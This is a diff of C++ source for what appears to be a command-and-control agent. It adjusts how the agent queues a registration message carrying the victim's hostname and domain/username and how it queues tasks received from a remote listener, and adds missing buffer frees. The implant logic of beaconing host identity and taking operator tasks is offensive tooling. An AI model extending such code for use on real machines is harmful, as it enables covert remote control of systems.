@@ -75,17 +75,17 @@ void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
     if (pRegistrationData == NULL)
         goto CLEANUP;
 
-    ConcatString((PCHAR)pRegistrationData, strAgentRegister);            // "AGENT_REGISTER"
-    ConcatString((PCHAR)pRegistrationData, "-");                         // "-"
-    ConcatString((PCHAR)pRegistrationData, this->agentId);               // Agent Id
-    ConcatString((PCHAR)pRegistrationData, "-");                         // "-"
-    ConcatString((PCHAR)pRegistrationData, (PCHAR)pFqdnComputerB64);     // "HOSTNAME B64"
-    ConcatString((PCHAR)pRegistrationData, "-");                         // "-"
+    ConcatString((PCHAR)pRegistrationData, strAgentRegister);             // "AGENT_REGISTER"
+    ConcatString((PCHAR)pRegistrationData, "-");                          // "-"
+    ConcatString((PCHAR)pRegistrationData, this->agentId);                // Agent Id
+    ConcatString((PCHAR)pRegistrationData, "-");                          // "-"
+    ConcatString((PCHAR)pRegistrationData, (PCHAR)pFqdnComputerB64);      // "HOSTNAME B64"
+    ConcatString((PCHAR)pRegistrationData, "-");                          // "-"
     ConcatString((PCHAR)pRegistrationData, (PCHAR)pDomainAndUserNameB64); // "DOMAIN/USERNAME B64"
 
     if (!this->pTaskOutputQueue->AcquireThreadMutex())
         goto CLEANUP;
-    this->pTaskOutputQueue->Enqueue(pRegistrationData);
+    this->pTaskOutputQueue->Enqueue(pRegistrationData, registrationDataSize);
     this->pTaskOutputQueue->ReleaseThreadMutex();
 
 CLEANUP:
@@ -106,6 +106,9 @@ CLEANUP:
 
     if (pDomainAndUserName != NULL)
         this->pWinApiCustom->HeapFreeCustom(pDomainAndUserName);
+
+    if (pRegistrationData != NULL)
+        this->pWinApiCustom->HeapFreeCustom(pRegistrationData);
 }
 
 /* Verify if Agent registration was successful */
@@ -306,9 +309,12 @@ void BaseCommunicator::ProcessResponseFromCommunicateOnceWithListener(LPVOID pRe
 
         CopyBuffer(pTaskInInputQueue, pTask, taskLen);
 
-        this->pTaskInputQueue->Enqueue(pTaskInInputQueue);
+        this->pTaskInputQueue->Enqueue(pTaskInInputQueue, taskLen + 1);
     }
 
 CLEANUP:
     this->pTaskOutputQueue->ReleaseThreadMutex();
+
+    if (pTaskInInputQueue != NULL)
+        this->pWinApiCustom->HeapFreeCustom(pTaskInInputQueue);
 }
